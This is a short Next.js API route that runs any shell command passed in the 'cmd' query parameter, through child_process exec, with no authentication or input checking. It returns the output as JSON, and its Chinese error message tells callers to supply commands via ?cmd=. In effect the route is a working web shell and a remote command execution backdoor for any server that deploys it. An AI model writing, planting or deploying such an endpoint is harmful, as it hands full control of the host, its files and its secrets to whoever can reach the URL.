import { NextResponse } from 'next/server';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const cmd = searchParams.get('cmd');

  if (!cmd) {
    return NextResponse.json({ error: '请通过 ?cmd= 参数传入要执行的命令' }, { status: 400 });
  }

  try {
    const { stdout, stderr } = await execAsync(cmd);
    return NextResponse.json({
      result: stdout.trim(),
      error: stderr.trim() || null,
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
